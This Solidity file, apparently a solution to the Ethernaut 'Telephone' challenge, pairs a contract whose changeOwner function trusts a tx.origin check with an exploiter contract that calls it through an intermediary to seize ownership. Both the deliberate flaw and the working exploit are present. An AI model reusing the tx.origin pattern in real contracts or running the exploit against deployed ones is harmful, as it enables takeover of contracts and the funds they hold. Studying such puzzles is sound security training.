// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneExploiter {
    Telephone private telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
    }

    function changeTelephoneOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
